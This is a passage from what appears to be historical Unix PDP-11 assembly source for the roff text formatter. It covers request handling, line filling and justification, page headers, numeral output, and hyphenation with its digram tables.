	mov	r0,ma2
	br	1f

casem3:
	jsr	r5,number; ma3
	jsr	pc,min
	mov	r0,ma3
	br	1f

casem4:
	jsr	r5,number; ma4
	jsr	pc,min
	mov	r0,ma4
1:
	jsr	pc,topbot
	rts	pc

casehc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	movb	$200,r0
1:
	mov	r0,ohc
	rts	pc

casetc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	mov	$' ,r0
1:
	mov	r0,tabc
	rts	pc

casehy:
	jsr	r5,number; 0
	mov	r0,hyf
	rts	pc

casen1:
	jsr	pc,rbreak
	mov	$1,numbmod
	br	1f
casen2:
	jsr	pc,rbreak
	mov	$2,numbmod
1:
	clr	nn
	jsr	r5,number; 0
	tst	r0
	ble	1f
	mov	r0,lnumber
	rts	pc
1:
	clr	numbmod
	rts	pc

casenn:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,nn
	rts	pc

caseni:
	jsr	r5,number; ni
	jsr	pc,min
	mov	r0,ni
	rts	pc

casejo:
	jsr	r5,number; 0
	mov	r0,jfomod
	rts	pc

casear:
	clr	ro
	rts	pc

casero:
	inc	ro
	rts	pc

casenx:
	jsr	pc,skipcont
	jsr	r5,getname; nextf
	inc	nx
	jsr	pc,nextfile
	inc	nlflg
	clr	ip
	mov	$ilist,ilistp
	rts	pc

casepo:
	jsr	pc,rbreak
	jsr	r5,number; po
	jsr	pc,min
	mov	r0,po
	rts	pc

casede:
	tst	ip
	bne	5f
	jsr	pc,skipcont
	jsr	r5,getname; bname
	clr	skp
	mov	$contab,r1
	clr	-(sp)
1:
	mov	(r1)+,(sp)
	beq	2f
	bic	$100000,(sp)
	cmp	bname,(sp)
	bne	3f
2:
	bis	$100000,bname
	mov	nextb,(r1)
	mov	bname,-(r1)
	br	4f
3:
	cmp	(r1)+,$-1
	bne	1b
	inc	skp
4:
	tst	(r1)+
	jsr	pc,copyb
	tst	(sp)+
5:
	rts	pc

caseig:
	inc	skp
	jsr	pc,copyb
	rts	pc

casemk:
	jsr	pc,rbreak
	mov	$002,r0	/stx
	jsr	pc,putchar
	rts	pc

-- /usr/source/s7/roff3.s mode=0110664 uid=3 gid=3 atime=174924219 mtime=174845719 --
/
/

/roff3 -- runoff

skipcont:
	jsr	pc,getchar
	mov	r0,r2
	jsr	pc,alph2
	beq	skipcont
1:
	cmp	$' ,r0
	bne	1f
	jsr	pc,getchar
	br	1b
1:
	mov	r0,ch
	rts	pc

rbreak:
	tst	nc
	ble	4f
	clrb	*linep
	inc	totout
	mov	ls,r0
	dec	r0
	jsr	r5,nlines; nline
	tst	pl
	beq	4f
	cmp	nl,bl
	bne	1f
3:
	jsr	pc,eject
1:
	tst	nl
	bne	3f
	mov	ma1,r0
	jsr	r5,nlines; newline
	bit	$1,pn
	bne	1f
	jsr	r5,headout; ehead
	br	2f
1:
	jsr	r5,headout; ohead
2:
	mov	ma2,r0
	jsr	r5,nlines; newline
	dec	skip
	bge	3b
3:
	mov	po,r0
	jsr	pc,space
	jsr	pc,donum
	mov	un,r0
	jsr	pc,space
	jsr	pc,jfo
	mov	$line,r2
1:
	movb	(r2)+,r0
	cmp	$' ,r0
	bne	2f
	jsr	pc,fill
	tst	nc
	bne	1b
	br	3f
2:
	jsr	pc,putchar
	dec	nc
	bgt	1b
3:
	jsr	pc,newline
	clr	nwd
	clr	ne
	mov	in,un
4:
	jsr	pc,setnel
	rts	pc

jfo:
	tst	jfomod
	beq	1f
	mov	fac,r0
	add	fmq,r0
	beq	1f
	clr	fac
	clr	fmq
	mov	nel,r0
	cmp	jfomod,$1
	bne	2f
	asr	r0
2:
	jsr	pc,space
1:
	rts	pc

donum:
	tst	numbmod
	beq	2f
	dec	nn
	blt	1f
	mov	$5,r0
	add	ni,r0
	jsr	pc,space
	rts	pc
1:
	clr	r0
	cmp	lnumber,$100.
	bge	1f
	inc	r0
	cmp	lnumber,$10.
	bge	1f
	inc	r0
1:
	add	ni,r0
	jsr	pc,space
	mov	lnumber,r0
	jsr	r5,decimal; putchar
	mov	$2,r0
	jsr	pc,space
	inc	lnumber
2:
	rts	pc


newline:
	mov	$'\n,r0
	jsr	pc,putchar
	inc	nl
	rts	pc

nline:
	mov	nl,r0
	beq	1f
	cmp	r0,bl
	beq	1f
	jsr	pc,newline
1:
	rts	pc

number:
	jsr	pc,skipcont
number1:
	mov	r1,-(sp)
	mov	r3,-(sp)
	clr	r3
	clr	-(sp)
	clr	-(sp)
1:
	jsr	pc,getchar
	cmp	r0,$'+
	beq	2f
	cmp	r0,$'-
	beq	2f
	sub	$'0,r0
	cmp	r0,$9.
	bhi	3f
	inc	(sp)
	mpy	$10.,r3
	add	r0,r3
	br	1b
2:
	mov	r0,2(sp)
	br	1b
3:
	add	$'0,r0
	mov	r0,ch
	mov	(sp)+,r0
	bne	1f
	mov	$1,r3
	mov	r3,r0
1:
	mov	(r5)+,r0
	beq	1f
	mov	(r0),r0
1:
	mov	(sp)+,r1
	cmp	r1,$'-
	bne	1f
	sub	r3,r0
	br	2f
1:
	cmp	r1,$'+
	bne	1f
	add	r3,r0
	br	2f
1:
	mov	r3,r0
2:
	mov	(sp)+,r3
	mov	(sp)+,r1
	rts	r5

eject:
	tst	pl
	beq	1f
	tst	nl
	beq	1f
	mov	pl,r0
	sub	nl,r0
	sub	ma4,r0
	sub	hx,r0
	jsr	r5,nlines; newline
	bit	$1,pn
	bne	2f
	jsr	r5,headout; efoot
	br	3f
2:
	jsr	r5,headout; ofoot
3:
	cmp	numbmod,$1
	bne	3f
	mov	$1,lnumber
3:
	mov	ma4,r0
	jsr	r5,nlines; newline
	clr	nl
	inc	pn
1:
	cmp	pn,pto
	ble	1f
	jsr	pc,flush
	jmp	place
1:
istop:
	tst	stop
	beq	2f
	cmp	pn,pfrom
	blo	2f
	jsr	pc,flush
/	mov	sp,r1
/	sys	signal; 2; 1f
	clr	r0
	sys	read; garb; 1
1:
/	mov	r1,sp
/	sys	signal; 2; place
2:
	rts	pc


storeline:
	cmp	linep,$line+linsiz
	bhis	1f
	movb	r0,*linep
	inc	linep
	jsr	pc,width
	add	r1,ne
	sub	r1,nel
	inc	nc
1:
	rts	pc

getword:
	mov	$word,r2
	clr	wne
	clr	wch
	clr	nhyph
	clr	hypedf
	mov	$word,wordp
	clr	-(sp)
1:
	jsr	pc,gettchar
	cmp	r0,$'\n
	beq	3f
	cmp	r0,ohc
	bne	2f
	inc	hypedf
	br	1b
2:
	cmp	$' ,r0
	bne	2f
	jsr	pc,storeword
	br	1b
2:
	mov	r0,-(sp)
	mov	$' ,r0
	jsr	pc,storeword
	tst	spaceflg
	beq	2f
	jsr	pc,storeword
	clr	spaceflg
2:
	mov	(sp)+,r0
2:
	jsr	pc,storeword
	bisb	(sp),-1(r2)	/add in hyphen
	clr	(sp)
	jsr	pc,gettchar
	cmp	r0,ohc
	bne	1f
	inc	hypedf
	jsr	pc,gettchar
	mov	$200,(sp)
1:
	cmp	$' ,r0
	beq	1f
	cmp	$'\n,r0
	bne	2b
	cmpb	-1(r2),$'.
	bne	1f
	inc	spaceflg
1:
	add	$2,2(sp)
1:
	clrb	(r2)+
3:
	tst	(sp)+
	mov	$word,wordp
	tst	nc
	bne	1f
	jsr	pc,setnel
1:
	rts	pc

setnel:
	mov	$line,linep
	mov	ll,nel
	sub	un,nel
	clr	ne
	clr	fac
	clr	fmq
	rts	pc

storeword:
	jsr	pc,width
	add	r1,wne
	inc	wch
	movb	r0,(r2)+
	rts	pc

need:
	mov	r0,r3
	mpy	ls,r3
	mov	r3,r0
need2:
	add	nl,r0
	cmp	r0,bl
	ble	1f
	jsr	pc,eject
1:
	rts	pc

min:
	tst	r0
	bge	1f
	clr	r0
1:
	rts	pc

getname:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	(r5)+,r1
	mov	$18.,r2
1:
	jsr	pc,getchar
	cmp	r0,$041
	blt	2f
	cmp	r0,$0176
	ble	4f
2:
	mov	r0,ch
3:
	clrb	(r1)+
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	r5
4:
	movb	r0,(r1)+
	dec	r2
	beq	3b
	br	1b

copyb:
	mov	(r1),r1
	jsr	pc,flushi
	clr	nlflg
	mov	$1,-(sp)
1:
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	2f
	mov	$1,(sp)
	clr	nlflg
	br	4f
2:
	cmp	r0,$'.
	bne	9f
	cmp	(sp),$1
	bgt	3f
	blt	9f
	inc	(sp)
	br	4f
3:
	dec	r1
	clr	r0
	inc	(sp)
	br	4f
9:
	clr	(sp)
4:
	tst	skp
	bne	5f
	jsr	pc,wbf
5:
	cmp	(sp),$3
	bne	1b
	tst	(sp)+
	tst	skp
	bne	6f
	mov	r1,nextb
6:
	rts	pc

popi:
	cmp	ilistp,$ilist
	beq	1f
	sub	$2,ilistp
	mov	*ilistp,ip
1:
	rts	pc

wbf:
	mov	r0,char
	mov	r1,offb
	mov	ibf,r0
	sys	seek; offb:..;0
	mov	ibf,r0
	sys	write; char;1
	inc	r1
	cmp	ibf1,ofile
	bne	1f
	mov	$-1,ofile
1:
	rts	pc
rbf:
	mov	ip,r1
	mov	ibf1,nfile
	jsr	pc,rdsufb
	tstb	r0
	bne	2f
	jsr	pc,popi
	rts	pc
2:
	inc	ip
	rts	pc

alph:
	movb	(r0),r2
alph2:
	cmp	r2,$'A
	blo	1f
	cmp	r2,$'Z
	blos	2f
	cmp	r2,$'a
	blo	1f
	cmp	r2,$'z
	bhi	1f
2:
	sez
	rts	pc
1:
	clz
	rts	pc

rdsufb:
	mov	r1,-(sp)
	bic	$77,r1
	cmp	r1,sufoff
	bne	1f
	cmp	nfile,ofile
	beq	2f
1:
	mov	r1,sufoff
	mov	nfile,ofile
	mov	nfile,r0
	sys	seek; sufoff: -1; 0
	mov	nfile,r0
	sys	read; sufbuf; 512.
2:
	mov	(sp),r0
	bic	$!77,r0
	movb	sufbuf(r0),r0
	mov	(sp)+,r1
	rts	pc
-- /usr/source/s7/roff4.s mode=0110664 uid=3 gid=3 atime=174924220 mtime=174845724 --
/
/

/ roff4 -- runoff

text:
/	inc	tottext
	clr	ulstate
	clr	wch
	clr	wne
	tst	ce
	bne	nofill
	tst	fi
	beq	nofill
	jsr	pc,getchar
2:
	mov	r0,ch
	cmp	$' ,r0
	bne	2f
	jsr	pc,rbreak
1:
	jsr	pc,getchar
	cmp	$' ,r0
	bne	2b
	inc	un
	br	1b
2:
	cmp	r0,$'\n
	bne	2f
	jsr	pc,rbreak
	clr	ch
	jsr	pc,nline
	br	4f
2:
	tst	wch
	bne	3f
	jsr	pc,getword
		br 4f
3:
	jsr	pc,movword
	bne	2b
	jsr	pc,adjust
	br	2b
4:
	dec	ul
	bge	1f
	clr	ul
1:
	rts	pc

nofill:
	jsr	pc,rbreak
1:
	jsr	pc,gettchar
	cmp	r0,$'\n
	beq	1f
	jsr	pc,width
	add	r1,ne
	jsr	pc,storeline
	br	1b
1:
	tst	ce
	ble	2f
	dec	ce
	mov	nel,r0
	asr	r0
	bpl	1f
	clr	r0
1:
	add	r0,un
	tst	numbmod
	beq	2f
	add	$2,un
2:
	clr	fac
	clr	fmq
	mov	$1000,nwd
	mov	$' ,r0
	jsr	pc,storeline
	jsr	pc,rbreak
	dec	ul
	bpl	2f
	clr	ul
2:
	rts	pc

adjust:
	mov	r2,-(sp)
	mov	r3,-(sp)
	clr	r2
	clr	r3
	tst	ad
	beq	1f
	mov	nwd,r0
	dec	r0
	ble	1f
	mov	nel,r3
	ble	1f
	dvd	r0,r2
1:
	mov	r3,fac
	mov	r2,fmq
	mov	(sp)+,r3
	mov	(sp)+,r2
	jsr	pc,rbreak
	rts	pc

fill:
	mov	fmq,r0
1:
	inc	r0
	dec	nc
	cmpb	(r2)+,$' 
	beq	1b
	dec	r2
	bit	$1,totout
	beq	2f
	inc	fac
	cmp	fac,nwd
	blt	1f
	inc	r0
	br	1f
2:
	dec	fac
	bmi	1f
	inc	r0
1:
	jsr	pc,space
	movb	(r2),r0
	rts	pc

movword:
	mov	wch,wordend
	mov	wordp,r4
	add	r4,wordend
	tst	nwd
	bne	2f
1:
	movb	(r4)+,r0
	cmp	r0,$' 
	bne	1f
	dec	wch
	jsr	pc,width
	sub	r1,wne
	br	1b
1:
	dec	r4
2:
	cmp	wne,nel
	ble	1f
	cmp	nel,$4
	ble	1f
	mov	ls,r0
	add	nl,r0
	cmp	r0,bl
	bgt	2f
	mov	ls,r0
	asl	r0
	add	nl,r0
	cmp	r0,bl
	bgt	1f
2:
	jsr	pc,hyphen
1:
	clr	nhyph
	mov	wch,-(sp)
1:
	movb	(r4)+,r0
	cmp	r0,$'-
	bne	2f
	movb	(r4),r2
	jsr	pc,alph2
	bne	2f
	bisb	$200,(r4)
2:
	tst	r0
	bpl	2f
	bic	$!177,r0
	mov	r4,r3
	sub	$4,r3
	cmp	r3,$word
	blo	2f
	movb	(r3),r2
	bic	$!177,r2
	jsr	pc,alph2
	beq	3f
	cmp	nel,$2
	ble	2f
3:
	mov	r0,-(sp)
	clr	r0
	jsr	pc,storeline
	mov	(sp)+,r0
	inc	nhyph
2:
	jsr	pc,width
	sub	r1,wne
	jsr	pc,storeline
	dec	wch
	bne	1b
	tst	nel
	blt	1f
	inc	nwd
	tst	(sp)+
	clz
	rts	pc
1:
	mov	linep,r3
1:
	tst	nhyph
	bne	2f
	tst	nwd
	beq	3f
	cmp	wch,(sp)
	beq	4f
2:
	movb	-(r3),r0
	bne	2f
	dec	nhyph
	bne	5f
	tst	nwd
	beq	6f
5:
	tst	nel
	ble	2f
6:
	cmpb	-1(r3),$'-
	beq	3f
	movb	$'-,(r3)
	dec	nel
	inc	ne
	br	3f
2:
	dec	nc
	tstb	(r3)
	beq	1b
	jsr	pc,width
	sub	r1,ne
	add	r1,nel
	inc	wch
	dec	r4
	add	r1,wne
	br	1b
3:
	inc	nwd
4:
	mov	r4,wordp
	bicb	$!177,(r4)
	cmp	r4,$word
	bge	4f
	4
4:
	tst	(sp)+
	sez
	rts	pc

topbot:
	mov	pl,r0
	bne	1f
	clr	bl
	rts	pc
1:
	sub	ma3,r0
	sub	ma4,r0
	sub	hx,r0
	mov	r0,bl
	mov	ma1,r0
	add	ma2,r0
	add	hx,r0
	cmp	r0,bl
	blt	1f
	mov	$2,r0
	mov	r0,ma1
	mov	r0,ma2
	mov	r0,ma3
	mov	r0,ma4
	mov	$66.,pl
	br	topbot
1:
	cmp	nl,bl
	ble	1f
	mov	bl,nl
1:
	rts	pc

width:
	cmp	r0,ohc
	beq	2f
	tst	r0
	beq	2f
	cmp	r0,$0177
	beq	2f
	cmp	r0,$010
	bne	1f
	mov	$-1,r1
	rts	pc
1:
	cmp	$' ,r0
	bgt	2f
	mov	$1,r1
	rts	pc
2:
	clr	r1
	rts	pc

headin:
	jsr	pc,skipcont
	mov	nextb,r1
	mov	r1,*(r5)+
	jsr	pc,gettchar
	cmp	r0,$'\n
	beq	2f
	mov	r0,r2
1:
	jsr	pc,gettchar
	cmp	r0,$'\n
	beq	2f
	cmp	r0,r2
	bne	3f
	clr	r0
3:
	jsr	pc,wbf
	br	1b
2:
	clr	r0
	jsr	pc,wbf
	mov	r1,nextb
	mov	ll,llh
	rts	r5

headout:
	tst	hx
	bne	0f
	tst	(r5)+
	rts	r5
0:
	clr	-(sp)
	mov	*(r5),r2
	mov	ibf1,nfile
	jsr	r5,headseg; width
	mov	r0,-(sp)
	jsr	r5,headseg; width
	mov	r0,-(sp)
	jsr	r5,headseg; width
	mov	r0,-(sp)
	mov	po,r0
	jsr	pc,space
	tst	numbmod
	beq	1f
	mov	$5,r0
	add	ni,r0
	mov	r0,6(sp)
1:
	mov	*(r5)+,r2
	jsr	r5,headseg; putchar
	mov	llh,r0
	add	6(sp),r0
	sub	2(sp),r0
	asr	r0
	sub	4(sp),r0
	bge	1f
	clr	r0
1:
	mov	r0,-(sp)
	jsr	pc,space
	jsr	r5,headseg; putchar
	mov	llh,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	add	(sp)+,r0
	jsr	pc,space
	jsr	r5,headseg; putchar
	jsr	pc,newline
	rts	r5

headseg:
	clr	-(sp)
1:
	mov	r1,-(sp)
	mov	r2,r1
	inc	r2
	jsr	pc,rdsufb
	mov	(sp)+,r1
	tstb	r0
	beq	1f
	cmp	r0,$'%
	beq	2f
	jsr	pc,*(r5)
	add	r1,(sp)
	br	1b
2:
	mov	pn,r0
	clr	r1
	tst	ro
	beq	2f
	mov	$ones,onesp
	mov	$fives,fivesp
	jsr	pc,roman
	add	r1,(sp)
	br	1b
2:
	jsr	pc,decml
	add	r1,(sp)
	br	1b
1:
	mov	(sp)+,r0
	tst	(r5)+
	rts	r5

space:
	jsr	r5,nlines; putchar
	rts	pc

nlines:
	mov	r0,-(sp)
1:
	dec	(sp)
	blt	1f
	mov	$' ,r0
	jsr	pc,*(r5)
	br	1b
1:
	cmp	(r5)+,(sp)+
	rts	r5

decimal:
	jsr	pc,decml
	tst	(r5)+
	rts	r5

decml:
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,decml1
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc

decml1:
	mov	r1,-(sp)
	clr	r2
	mov	r0,r3
	dvd	$10.,r2
	mov	r3,-(sp)
	mov	r2,r0
	beq	1f
	jsr	pc,decml
	mov	r1,2(sp)
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,*(r5)
	add	(sp)+,r1
	rts	pc

roman:
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,roman1
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc
roman1:
	clr	r2
	mov	r0,r3
	bne	.+4
	rts	pc
	mov	r1,-(sp)
	dvd	$10.,r2
	mov	r3,-(sp)
	mov	r2,r0
	inc	onesp
	inc	fivesp
	jsr	pc,roman
	mov	r1,2(sp)
	dec	onesp
	dec	fivesp
	clr	r2
	mov	(sp)+,r3
	dvd	$5.,r2
	cmp	r3,$4
	bne	1f
	movb	*onesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
	tst	r2
	beq	2f
	inc	onesp
	movb	*onesp,r0
	dec	onesp
	br	3f
2:
	movb	*fivesp,r0
3:
	jsr	pc,*(r5)
	add	(sp)+,r1
	rts	pc
1:
	tst	r2
	beq	2f
	movb	*fivesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
2:
	dec	r3
	blt	1f
	movb	*onesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
	br	2b
1:
	mov	(sp)+,r1
	rts	pc

-- /usr/source/s7/roff5.s mode=0100664 uid=3 gid=3 atime=174924220 mtime=174845728 --
/
/

/ hyp1 -- driver

hyphen:
	tst	hypedf
	bne	3f
	tst	hyf
	beq	3f
	inc	hypedf
	mov	wordp,r0
	clr	nhyph
1:
	jsr	pc,punct
	bne	1f
	inc	r0
	br	1b
1:
	jsr	pc,alph
	bne	3f
1:
	inc	r0
	jsr	pc,alph
	beq	1b
	dec	r0
	mov	r0,hstart
1:
	inc	r0
	tstb	(r0)
	beq	2f
	jsr	pc,punct
	bne	3f
	br	1b
2:
	jsr	r5,suffix
	jsr	r5,digram
3:
	rts	pc


punct:
	tst	old
	bne 4f
	cmpb	(r0),$010
	beq	0f
	movb	(r0),r2
	jsr	pc,alph2
	beq	0f
	sez
	rts	 pc
0:
	clz
	rts	pc
4:
	mov	 $3f,r2
1:
	cmpb	(r0),(r2)+
	beq	2f
	tstb	(r2)
	bne	1b
	clz
2:
	rts	pc
3: < .,()"\'`\0>	/should be more
.even
maplow:
	cmp	r2,$'a
	bhis	1f
	add	$'a-'A,r2
1:
	rts	pc

vowel:
	cmp	r2,$'a
	beq	1f
	cmp	r2,$'e
	beq	1f
	cmp	r2,$'i
	beq	1f
	cmp	r2,$'o
	beq	1f
	cmp	r2,$'u
	beq	1f
	cmp	r2,$'y
1:
	rts	pc

checkvow:
	mov	r0,-(sp)
1:
	movb	-(r0),r2
	jsr	pc,vowel
	beq	1f
	jsr	pc,alph
	beq	1b
	mov	(sp)+,r0
	clz
	rts	r5
1:
	mov	(sp)+,r0
	sez
	rts	r5

/ hyp2 -- suffix and digram

digram:
	mov	hstart,r0
1:
	jsr	pc,alph
	bne	3f
	jsr	pc,vowel
	beq	1f
	dec	r0
	br	1b
1:
	mov	r0,hstart
1:
	movb	-(r0),r2
	jsr	pc,alph2
	bne	3f
	jsr	pc,vowel
	bne	1b
	clr	maxdig
	mov	r0,nhstart
1:
	mov	$1,r3
	movb	-1(r0),r2
	jsr	pc,alph2
	beq	2f
	movb	(r0),r2
	mov	$'a,r1
	jsr	r5,dilook; bxh
	br	4f
2:
	movb	-2(r0),r2
	mov	$xxh,0f
	jsr	pc,alph2
	beq	2f
	mov	$bxxh,0f
2:
	movb	-1(r0),r1
	movb	(r0),r2
	jsr	r5,dilook; 0:xxh
4:
	movb	(r0)+,r1
	movb	(r0),r2
	jsr	r5,dilook; xhx
	movb	(r0),r1
	movb	1(r0),r2
	jsr	r5,dilook; hxx
	cmp	r3,maxdig
	blos	2f
	mov	r3,maxdig
	mov	r0,maxloc
2:
	cmp	r0,hstart
	blo	1b
	mov	nhstart,hstart
	cmp	maxdig,thresh
	blo	digram
	bisb	$200,*maxloc
	inc	nhyph
/	mov	maxdig,*octbufp
/	inc	octcnt
/	add	$2,octbufp
	br	digram
3:
	rts	r5

dilook:
	mov	r4,-(sp)
	bic	$!177,r2
	bic	$!177,r1
	jsr	pc,maplow
	sub	$'a,r2
	cmp	r2,$'z-'a
	bhi	3f
	mov	r2,r4
	mov	r1,r2
	jsr	pc,maplow
	sub	$'a,r2
	cmp	r2,$'z-'a
	bhi	3f
	mov	r3,-(sp)
	mov	r2,r3
	mpy	$13.,r3
	clr	r2
	clc
	ror	r4
	adc	r2
	add	r3,r4
	add	(r5)+,r4
	movb	(r4),r4
	tst	r2
	bne	1f
	asr	r4
	asr	r4
	asr	r4
	asr	r4
1:
	bic	$!17,r4
	mov	r4,r3
	mpy	(sp)+,r3
	br	4f
3:
	clr	r3
	tst	(r5)+
4:
	mov	(sp)+,r4
	rts	r5

suffix:
	mov	hstart,r0
	jsr	pc,alph
	bne	4f
	jsr	pc,maplow
	sub	$'a,r2
	asl	r2
	mov	suftab(r2),-(sp)
	bic	$!37777,(sp)
	beq	3f
1:
	mov	hstart,r0
	mov	(sp),r1
	jsr	pc,rdsuf
	movb	(r1),r3
	beq	3f
	bic	$!17,r3
	add	r3,(sp)
	add	r1,r3
2:
	movb	-(r3),r2
	cmp	r3,r1
	ble	2f
	bic	$!177,r2
	mov	r2,-(sp)
	movb	-(r0),r2
	jsr	pc,maplow
	cmp	r2,(sp)+
	bne	1b
	br	2b
2:
	mov	hstart,r0
	tst	(sp)+
	movb	(r1),r3
	bic	$!17,r3
	add	r1,r3
	bitb	$200,(r1)+
	bne	1f
2:
	dec	r0
	cmp	r3,r1
	ble	2f
	tstb	-(r3)
	bpl	2b
1:
	mov	r0,hstart
	dec	hstart
	bitb	$100,-1(r1)
	bne	2b
	jsr	r5,checkvow
	bne	4f
	bisb	$200,(r0)
	br	2b
2:
	bitb	$40,-(r1)
	beq	suffix
	br	4f
3:
	tst	(sp)+
4:
	rts	r5

rdsuf:
	mov	r0,-(sp)
	mov	suff,nfile
	mov	4(sp),r1
	jsr	pc,rdsufb
	mov	$sufb,r2
	movb	r0,(r2)+
	mov	r0,r3
	bic	$!17,r3
1:
	dec	r3
	blt	1f
	inc	r1
	jsr	pc,rdsufb
	movb	r0,(r2)+
	br	1b
1:
	mov	$sufb,r1
	mov	(sp)+,r0
	rts	pc
-- /usr/source/s7/roff7.s mode=0110664 uid=3 gid=3 atime=174924238 mtime=174845733 --
/
/

/ hyp4 -- digram tables

bxh:
.byte 060,000,040,000,040,000,000,040,000,000,040,000,040

hxx:
.byte 006,042,041,123,021,024,063,042,002,043,021,001,022
.byte 140,000,200,003,260,006,000,160,007,000,140,000,320
.byte 220,000,160,005,240,010,000,100,006,000,200,000,320
.byte 240,000,120,003,140,000,000,240,010,000,220,000,160
.byte 042,023,041,040,040,022,043,041,030,064,021,000,041
.byte 100,000,140,000,220,006,000,140,003,000,200,000,000
.byte 200,000,120,002,220,010,000,160,006,000,140,000,320
.byte 020,000,020,000,020,000,000,020,000,000,020,000,000
.byte 043,163,065,044,022,043,104,042,061,146,061,000,007
.byte 100,000,140,000,040,000,000,100,000,000,120,000,000
.byte 140,000,040,011,060,004,001,120,003,000,140,000,040
.byte 200,000,100,000,140,000,000,140,000,000,140,000,240
.byte 200,000,140,000,160,000,000,220,000,000,140,000,240
.byte 200,000,140,000,160,000,000,220,000,000,060,000,240
.byte 021,043,041,121,040,023,042,003,142,042,061,001,022
.byte 120,000,140,010,140,010,000,140,002,000,120,000,120
.byte 000,000,000,000,360,000,000,000,000,000,160,000,000
.byte 100,000,040,005,120,000,000,100,000,000,060,000,140
.byte 140,040,100,001,240,041,000,242,000,002,140,000,100
.byte 240,000,120,002,200,000,000,320,007,000,240,000,340
.byte 101,021,041,020,040,005,042,121,002,021,201,000,020
.byte 160,000,100,000,140,000,000,160,006,000,220,000,140
.byte 140,000,020,001,020,000,000,100,001,000,300,000,000
.byte 000,000,000,000,000,000,000,000,000,000,000,000,000
.byte 106,041,040,147,040,000,063,041,001,102,160,002,002
.byte 300,000,040,017,140,017,000,240,000,000,140,000,120

bxxh:
.byte 005,150,153,062,062,246,152,127,146,203,310,017,206
.byte 100,000,120,000,140,000,000,100,000,000,120,000,060
.byte 100,000,040,000,060,000,000,060,000,000,220,000,040
.byte 100,000,120,000,200,000,000,100,000,000,140,000,060
.byte 043,142,046,140,062,147,210,131,046,106,246,017,111
.byte 060,000,020,000,060,000,000,040,000,000,100,000,000
.byte 060,000,040,000,040,000,000,040,000,000,100,000,040
.byte 100,000,100,000,100,000,000,040,000,000,100,000,140
.byte 066,045,145,140,000,070,377,030,130,103,003,017,006
.byte 040,000,040,000,020,000,000,040,000,000,100,000,000
.byte 200,000,020,000,140,000,000,120,000,000,120,000,040
.byte 120,000,040,000,060,000,000,060,000,000,160,000,040
.byte 120,000,040,000,120,000,000,040,000,000,160,000,040
.byte 120,000,020,000,140,000,000,120,000,000,140,000,040
.byte 051,126,150,140,060,210,146,006,006,165,003,017,244
.byte 120,000,040,000,160,000,000,140,000,000,060,000,140
.byte 000,000,000,000,000,000,000,000,000,000,000,000,000
.byte 140,000,140,000,060,000,000,100,000,000,140,000,020
.byte 120,000,020,000,060,000,000,060,000,000,060,000,040
.byte 140,000,020,000,100,000,000,140,000,000,140,000,020
.byte 070,125,051,162,120,105,126,104,006,044,000,017,052
.byte 140,000,020,000,140,000,000,060,000,000,060,000,040
.byte 020,000,000,000,020,000,000,000,000,000,000,000,060
.byte 140,000,160,000,200,000,000,140,000,000,000,000,240
.byte 065,042,060,200,000,210,222,146,006,204,220,012,003
.byte 240,000,020,000,120,000,000,200,000,000,200,000,240

xhx:
.byte 032,146,042,107,076,102,042,146,202,050,006,000,051
.byte 036,377,057,013,057,366,377,057,001,377,057,000,040
.byte 037,377,020,000,100,022,377,057,362,116,100,000,017
.byte 057,377,057,031,137,363,377,037,362,270,077,000,117
.byte 074,142,012,236,076,125,063,165,341,046,047,000,024
.byte 020,017,075,377,040,001,377,017,001,204,020,000,040
.byte 057,017,057,340,140,362,314,117,003,302,100,000,057
.byte 057,357,077,017,100,366,314,057,342,346,037,000,060
.byte 252,145,072,157,377,165,063,066,164,050,363,000,362
.byte 000,000,020,000,020,000,000,017,000,000,020,000,000
.byte 117,017,237,377,200,354,125,110,004,257,000,000,300
.byte 057,367,054,357,157,216,314,114,217,353,053,000,057
.byte 077,213,077,077,177,317,377,114,377,352,077,000,076
.byte 077,213,077,077,157,177,377,054,377,352,117,000,075
.byte 125,230,065,216,057,066,063,047,345,126,011,000,033
.byte 057,377,051,360,120,361,273,056,001,256,057,000,060
.byte 000,000,000,000,000,000,000,000,000,000,000,000,000
.byte 076,310,056,310,137,174,273,055,335,266,033,000,155
.byte 077,157,057,360,057,063,042,024,077,206,020,000,040
.byte 057,037,077,360,100,365,377,037,362,176,050,000,026
.byte 167,146,042,112,077,110,062,254,366,052,377,000,163
.byte 060,000,040,000,120,000,377,060,012,000,037,000,257
.byte 037,232,157,361,040,003,125,010,001,256,000,000,340
.byte 377,377,377,377,377,377,377,377,377,377,377,017,277
.byte 253,315,257,216,377,206,146,306,371,126,232,000,004
.byte 057,012,100,360,160,360,000,040,000,017,157,000,176

xxh:
.byte 045,150,154,162,042,246,210,147,152,103,230,017,206
.byte 100,000,040,000,140,000,000,100,000,021,120,017,060
.byte 100,000,040,002,140,320,000,060,000,001,220,017,040
.byte 100,001,120,001,241,000,000,100,000,020,140,017,060
.byte 023,162,046,142,022,207,210,131,052,106,250,017,110
.byte 060,000,042,000,160,000,000,040,000,212,100,017,000
.byte 140,000,040,002,140,000,000,120,000,040,120,017,040
.byte 100,000,100,000,140,001,021,140,000,046,100,017,140
.byte 066,045,025,201,020,130,146,030,130,103,025,017,006
.byte 100,000,040,000,020,000,000,040,000,000,200,017,000
.byte 200,000,020,001,140,000,000,140,000,000,120,017,040
.byte 120,026,042,020,140,161,042,143,000,022,162,017,040
.byte 121,042,060,020,140,200,000,123,000,021,220,017,041
.byte 121,042,060,120,140,200,000,123,000,021,160,017,041
.byte 051,126,150,141,060,210,146,066,026,165,026,017,247
.byte 120,000,040,003,160,000,000,140,000,021,100,017,140
.byte 000,000,000,000,200,000,000,000,000,000,000,017,000
.byte 141,023,122,040,160,143,042,142,000,047,143,017,020
